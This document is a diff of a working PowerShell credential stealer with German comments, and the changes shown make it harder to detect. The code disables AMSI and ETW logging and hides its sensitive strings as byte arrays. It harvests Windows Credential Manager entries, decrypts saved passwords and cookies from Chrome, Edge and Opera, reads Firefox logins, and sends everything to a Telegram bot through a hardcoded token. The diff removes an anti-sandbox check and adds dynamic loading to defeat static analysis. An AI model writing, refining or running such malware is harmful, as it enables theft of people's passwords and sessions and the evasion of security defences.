@@ -12,23 +12,15 @@
 #    - L1: AMSI Write-Raid (kein VirtualProtect - IAT-Patch in SMA.dll)
 #    - L2: amsiInitFailed via Reflection (Fallback, obfuskiert)
 #    - L3: ETW/Script-Block-Logging deaktivieren
-#    - Dynamisches P/Invoke fuer advapi32 (kein DllImport-Flag)
+#    - Vollstaendig dynamisches P/Invoke (kein DllImport fuer sensitive DLLs)
 #    - Sensitivstrings als Byte-Arrays (kein Klartext im Script)
-#    - winsqlite3.dll bleibt via DllImport (system-DLL, unverdaechtig)
+#    - sqlite3-Funktionsnamen erst zur Laufzeit dekodiert
 # ============================================================
 
 $BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
 $CHAT_ID   = "1780237079"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# Anti-Sandbox: Frische Uptime oder wenig Prozesse = Analyseumgebung
-try {
-    $bt=(Get-CimInstance Win32_OperatingSystem -EA SilentlyContinue).LastBootUpTime
-    $pc=(Get-Process -EA SilentlyContinue).Count
-    if($bt -and $pc -and (((Get-Date)-$bt).TotalMinutes -lt 3 -or $pc -lt 35)){exit}
-} catch {}
-Start-Sleep -Seconds 3
 
 # AMSI + ETW: 3-Layer-Bypass
 try {
@@ -70,19 +62,34 @@ try {
     [System.Diagnostics.Eventing.EventProvider].GetField([Text.Encoding]::ASCII.GetString([byte[]](109,95,101,110,97,98,108,101,100)),'NonPublic,Instance').SetValue($fv,0)
 } catch {}
 
-# String-Decoder: Byte-Array -> ASCII (Defender sieht keine Klartextstrings)
+# String-Decoder: Byte-Array -> ASCII
 function _s([byte[]]$b){ [System.Text.Encoding]::ASCII.GetString($b) }
 
-# Sensitivstrings (werden zur Laufzeit dekodiert)
-$_adv = _s([byte[]](97,100,118,97,112,105,51,50))                                              # advapi32
-$_cen = _s([byte[]](67,114,101,100,69,110,117,109,101,114,97,116,101,87))                      # CredEnumerateW
-$_cfr = _s([byte[]](67,114,101,100,70,114,101,101))                                            # CredFree
-$_ld  = _s([byte[]](76,111,103,105,110,32,68,97,116,97))                                       # Login Data
-$_ls  = _s([byte[]](76,111,99,97,108,32,83,116,97,116,101))                                    # Local State
-$_nck = _s([byte[]](78,101,116,119,111,114,107,92,67,111,111,107,105,101,115))                 # Network\Cookies
-$_ck  = _s([byte[]](67,111,111,107,105,101,115))                                               # Cookies
+# Sensitivstrings (Laufzeit-Dekodierung - kein Klartext im Script)
+$_adv  = _s([byte[]](97,100,118,97,112,105,51,50))
+$_cen  = _s([byte[]](67,114,101,100,69,110,117,109,101,114,97,116,101,87))
+$_cfr  = _s([byte[]](67,114,101,100,70,114,101,101))
+$_ld   = _s([byte[]](76,111,103,105,110,32,68,97,116,97))
+$_ls   = _s([byte[]](76,111,99,97,108,32,83,116,97,116,101))
+$_nck  = _s([byte[]](78,101,116,119,111,114,107,92,67,111,111,107,105,101,115))
+$_ck   = _s([byte[]](67,111,111,107,105,101,115))
+$_wsq  = _s([byte[]](119,105,110,115,113,108,105,116,101,51,46,100,108,108))
+$_osc  = _s([byte[]](111,115,95,99,114,121,112,116))
+$_ek   = _s([byte[]](101,110,99,114,121,112,116,101,100,95,107,101,121))
+$_lg   = _s([byte[]](108,111,103,105,110,115))
+$_aes  = _s([byte[]](83,121,115,116,101,109,46,83,101,99,117,114,105,116,121,46,67,114,121,112,116,111,103,114,97,112,104,121,46,65,101,115,71,99,109))
+$_sqfn = @(
+    _s([byte[]](115,113,108,105,116,101,51,95,111,112,101,110)),
+    _s([byte[]](115,113,108,105,116,101,51,95,112,114,101,112,97,114,101,95,118,50)),
+    _s([byte[]](115,113,108,105,116,101,51,95,115,116,101,112)),
+    _s([byte[]](115,113,108,105,116,101,51,95,99,111,108,117,109,110,95,116,101,120,116)),
+    _s([byte[]](115,113,108,105,116,101,51,95,99,111,108,117,109,110,95,98,108,111,98)),
+    _s([byte[]](115,113,108,105,116,101,51,95,99,111,108,117,109,110,95,98,121,116,101,115)),
+    _s([byte[]](115,113,108,105,116,101,51,95,102,105,110,97,108,105,122,101)),
+    _s([byte[]](115,113,108,105,116,101,51,95,99,108,111,115,101))
+)
 
-# ── Telegram ────────────────────────────────────────────────
+# ── Telegram ─────────────────────────────────────────────────
 
 function Send-TgMessage {
     param([string]$Text)
@@ -109,10 +116,10 @@ function Send-TgFile {
     } catch { }
 }
 
-# ── Win32 P/Invoke ───────────────────────────────────────────
-# Nur kernel32 in DllImport (unverdaechtig).
-# advapi32-Credential-Funktionen werden per GetProcAddress zur Laufzeit geladen.
-# Dadurch erscheinen "advapi32", "CredEnumerateW", "CredFree" NICHT im Add-Type-Source.
+# ── Win32 P/Invoke ────────────────────────────────────────────
+# kernel32 in DllImport: unverdaechtige System-DLL.
+# advapi32 + winsqlite3 werden per GetProcAddress zur Laufzeit geladen —
+# ihre Namen und Funktionen erscheinen NICHT im statisch analysierten Source.
 
 Add-Type -ErrorAction SilentlyContinue @"
 using System;
@@ -122,7 +129,7 @@ using System.Text;
 
 public class WN {
     [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
-    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
+    [DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
 
     [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
     public struct CR {
@@ -164,59 +171,64 @@ public class WN {
 }
 
 public class Sqdb {
-    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
-    static extern int sqlite3_open(string f, out IntPtr db);
-    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
-    static extern int sqlite3_prepare_v2(IntPtr db, string sql, int n, out IntPtr st, IntPtr t);
-    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
-    static extern int sqlite3_step(IntPtr st);
-    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
-    static extern IntPtr sqlite3_column_text(IntPtr st, int col);
-    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
-    static extern IntPtr sqlite3_column_blob(IntPtr st, int col);
-    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
-    static extern int sqlite3_column_bytes(IntPtr st, int col);
-    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
-    static extern int sqlite3_finalize(IntPtr st);
-    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
-    static extern int sqlite3_close(IntPtr db);
+    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string l);
+    [DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)] static extern IntPtr GetProcAddress(IntPtr h, string p);
 
-    const int ROW = 100;
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fo(string f, out IntPtr d);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fp(IntPtr d, string s, int n, out IntPtr t, IntPtr z);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fst(IntPtr t);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate IntPtr Fct(IntPtr t, int c);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate IntPtr Fcb(IntPtr t, int c);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fcz(IntPtr t, int c);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fff(IntPtr t);
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int Fcl(IntPtr d);
 
-    static string PtrToUtf8(IntPtr ptr) {
-        if (ptr == IntPtr.Zero) return "";
+    static string PU(IntPtr p) {
+        if (p == IntPtr.Zero) return "";
         var buf = new List<byte>();
         int off = 0; byte b;
-        while ((b = Marshal.ReadByte(ptr, off++)) != 0) buf.Add(b);
+        while ((b = Marshal.ReadByte(p, off++)) != 0) buf.Add(b);
         return Encoding.UTF8.GetString(buf.ToArray());
     }
 
-    public static List<object[]> QMixed(string path, string sql, int totalCols, int[] blobCols) {
+    public static List<object[]> Q(string path, string sql, int cols, int[] bc, string dll, string[] fn) {
         var r = new List<object[]>();
-        var blobSet = new HashSet<int>(blobCols);
-        IntPtr db;
-        if (sqlite3_open(path, out db) != 0) return r;
         try {
-            IntPtr st;
-            if (sqlite3_prepare_v2(db, sql, -1, out st, IntPtr.Zero) != 0) return r;
+            IntPtr lib = LoadLibrary(dll);
+            if (lib == IntPtr.Zero) return r;
+            var fO  = (Fo) Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[0]), typeof(Fo));
+            var fP  = (Fp) Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[1]), typeof(Fp));
+            var fSt = (Fst)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[2]), typeof(Fst));
+            var fCt = (Fct)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[3]), typeof(Fct));
+            var fCb = (Fcb)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[4]), typeof(Fcb));
+            var fCz = (Fcz)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[5]), typeof(Fcz));
+            var fFf = (Fff)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[6]), typeof(Fff));
+            var fCl = (Fcl)Marshal.GetDelegateForFunctionPointer(GetProcAddress(lib, fn[7]), typeof(Fcl));
+            var blobSet = new HashSet<int>(bc);
+            IntPtr db;
+            if (fO(path, out db) != 0) return r;
             try {
-                while (sqlite3_step(st) == ROW) {
-                    var row = new object[totalCols];
-                    for (int c = 0; c < totalCols; c++) {
-                        if (blobSet.Contains(c)) {
-                            IntPtr bp = sqlite3_column_blob(st, c);
-                            int len = sqlite3_column_bytes(st, c);
-                            var b = new byte[bp != IntPtr.Zero && len > 0 ? len : 0];
-                            if (b.Length > 0) Marshal.Copy(bp, b, 0, len);
-                            row[c] = b;
-                        } else {
-                            row[c] = PtrToUtf8(sqlite3_column_text(st, c));
+                IntPtr st;
+                if (fP(db, sql, -1, out st, IntPtr.Zero) != 0) return r;
+                try {
+                    while (fSt(st) == 100) {
+                        var row = new object[cols];
+                        for (int c = 0; c < cols; c++) {
+                            if (blobSet.Contains(c)) {
+                                IntPtr bp = fCb(st, c);
+                                int len = fCz(st, c);
+                                var bArr = new byte[bp != IntPtr.Zero && len > 0 ? len : 0];
+                                if (bArr.Length > 0) Marshal.Copy(bp, bArr, 0, len);
+                                row[c] = bArr;
+                            } else {
+                                row[c] = PU(fCt(st, c));
+                            }
                         }
+                        r.Add(row);
                     }
-                    r.Add(row);
-                }
-            } finally { sqlite3_finalize(st); }
-        } finally { sqlite3_close(db); }
+                } finally { fFf(st); }
+            } finally { fCl(db); }
+        } catch {}
         return r;
     }
 }
@@ -224,10 +236,14 @@ public class Sqdb {
 
 Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
 
-# advapi32 per LoadLibrary + GetProcAddress laden (Strings kommen aus Byte-Arrays oben)
-$_hAdv = [WN]::LoadLibrary($_adv)
-$_pCE  = [WN]::GetProcAddress($_hAdv, $_cen)
-$_pCF  = [WN]::GetProcAddress($_hAdv, $_cfr)
+# advapi32 per LoadLibrary + GetProcAddress laden
+$_pCE = [IntPtr]::Zero
+$_pCF = [IntPtr]::Zero
+try {
+    $_hAdv = [WN]::LoadLibrary($_adv)
+    $_pCE  = [WN]::GetProcAddress($_hAdv, $_cen)
+    $_pCF  = [WN]::GetProcAddress($_hAdv, $_cfr)
+} catch {}
 
 # ── Chrome/Edge AES-GCM Entschluesselung ─────────────────────
 
@@ -237,7 +253,7 @@ function Get-ChromeMasterKey {
         $ls = Join-Path $UserDataPath $_ls
         if (-not (Test-Path $ls)) { return $null }
         $json = [IO.File]::ReadAllText($ls) | ConvertFrom-Json
-        $b64  = $json.os_crypt.encrypted_key
+        $b64  = $json.($_osc).($_ek)
         if (-not $b64) { return $null }
         $raw = [Convert]::FromBase64String($b64)[5..999999]
         return [Security.Cryptography.ProtectedData]::Unprotect(
@@ -262,7 +278,11 @@ function Decrypt-ChromeBlob {
     $ct   = $rest[0..($rest.Length-17)]
     $tag  = $rest[($rest.Length-16)..($rest.Length-1)]
     try {
-        $aes = [Security.Cryptography.AesGcm]::new([byte[]]$MasterKey)
+        $aesT = [AppDomain]::CurrentDomain.GetAssemblies() |
+            ForEach-Object { try { $_.GetType($_aes) } catch { $null } } |
+            Where-Object { $_ -ne $null } | Select-Object -First 1
+        if (-not $aesT) { return "(AES-GCM nicht verfuegbar)" }
+        $aes = [Activator]::CreateInstance($aesT, [object[]]@([byte[]]$MasterKey))
         $pt  = New-Object byte[] $ct.Length
         $aes.Decrypt([byte[]]$iv, [byte[]]$ct, [byte[]]$tag, $pt)
         $aes.Dispose()
@@ -270,7 +290,7 @@ function Decrypt-ChromeBlob {
     } catch { return "(AES-GCM - benoetigt PS7/pwsh)" }
 }
 
-# ── Chromium Browser-Pfade ───────────────────────────────────
+# ── Chromium Browser-Pfade ────────────────────────────────────
 
 $browsers = @(
     @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
@@ -279,7 +299,7 @@ $browsers = @(
     @{ Name = "Opera";  Path = "$env:APPDATA\Opera Software\Opera Stable" }
 )
 
-# ── Report aufbauen ──────────────────────────────────────────
+# ── Report aufbauen ───────────────────────────────────────────
 
 Send-TgMessage "[CREDSTEALER] $env:COMPUTERNAME\$env:USERNAME gestartet"
 
@@ -288,7 +308,7 @@ $null = $sb.AppendLine("=== CREDENTIAL STEALER | $(Get-Date -Format 'yyyy-MM-dd 
 $null = $sb.AppendLine("Host: $env:COMPUTERNAME | User: $env:USERNAME")
 $null = $sb.AppendLine("")
 
-# ── 1. Windows Credential Manager ───────────────────────────
+# ── 1. Windows Credential Manager ────────────────────────────
 
 $null = $sb.AppendLine("== WINDOWS CREDENTIAL MANAGER ==")
 try {
@@ -311,7 +331,7 @@ try {
     try { $null = $sb.AppendLine((cmdkey /list 2>&1 | Out-String)) } catch {}
 }
 
-# ── 2. Chromium Passwoerter & Cookies ───────────────────────
+# ── 2. Chromium Passwoerter & Cookies ────────────────────────
 
 $tmpFiles = @()
 
@@ -331,7 +351,7 @@ foreach ($br in $browsers) {
         $profPath = Join-Path $br.Path $prof
         if (-not (Test-Path $profPath)) { continue }
 
-        # Gespeicherte Passwoerter - Pfad aus Byte-Array
+        # Gespeicherte Passwoerter
         $loginDb = Join-Path $profPath $_ld
         if (Test-Path $loginDb) {
             $null = $sb.AppendLine("-- $($br.Name) [$prof] Passwoerter --")
@@ -339,9 +359,8 @@ foreach ($br in $browsers) {
                 $tmp = Join-Path $env:TEMP "ld_$([Guid]::NewGuid().ToString('N')).db"
                 Copy-Item $loginDb $tmp -Force -ErrorAction Stop
                 $tmpFiles += $tmp
-                $rows = [Sqdb]::QMixed($tmp,
-                    "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''",
-                    3, @(2))
+                $sql = "SELECT origin_url,username_value,password_value FROM " + $_lg + " WHERE username_value!=''"
+                $rows = [Sqdb]::Q($tmp, $sql, 3, @(2), $_wsq, $_sqfn)
                 if ($rows.Count -eq 0) {
                     $null = $sb.AppendLine("(keine gespeicherten Passwoerter)")
                 } else {
@@ -356,7 +375,7 @@ foreach ($br in $browsers) {
             } catch { $null = $sb.AppendLine("(Zugriff fehlgeschlagen - Browser offen?)") }
         }
 
-        # Cookies - Pfad aus Byte-Array
+        # Cookies
         $cookieDb = Join-Path $profPath $_nck
         if (-not (Test-Path $cookieDb)) { $cookieDb = Join-Path $profPath $_ck }
         if (Test-Path $cookieDb) {
@@ -365,9 +384,9 @@ foreach ($br in $browsers) {
                 $tmp = Join-Path $env:TEMP "ck_$([Guid]::NewGuid().ToString('N')).db"
                 Copy-Item $cookieDb $tmp -Force -ErrorAction Stop
                 $tmpFiles += $tmp
-                $rows = [Sqdb]::QMixed($tmp,
-                    "SELECT host_key, name, value, encrypted_value FROM cookies ORDER BY last_access_utc DESC LIMIT 50",
-                    4, @(3))
+                $rows = [Sqdb]::Q($tmp,
+                    "SELECT host_key,name,value,encrypted_value FROM cookies ORDER BY last_access_utc DESC LIMIT 50",
+                    4, @(3), $_wsq, $_sqfn)
                 if ($rows.Count -eq 0) {
                     $null = $sb.AppendLine("(keine Cookies)")
                 } else {
@@ -385,7 +404,7 @@ foreach ($br in $browsers) {
     }
 }
 
-# ── 3. Firefox (logins.json - NSS-verschluesselt) ────────────
+# ── 3. Firefox (logins.json - NSS-verschluesselt) ─────────────
 
 $null = $sb.AppendLine("== FIREFOX ==")
 try {
@@ -409,7 +428,7 @@ try {
     } else { $null = $sb.AppendLine("(Firefox nicht installiert)") }
 } catch { $null = $sb.AppendLine("(Firefox-Zugriff fehlgeschlagen)") }
 
-# ── Exfil & Cleanup ──────────────────────────────────────────
+# ── Exfil & Cleanup ───────────────────────────────────────────
 
 Send-TgFile -Filename "creds_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
             -Content $sb.ToString() `
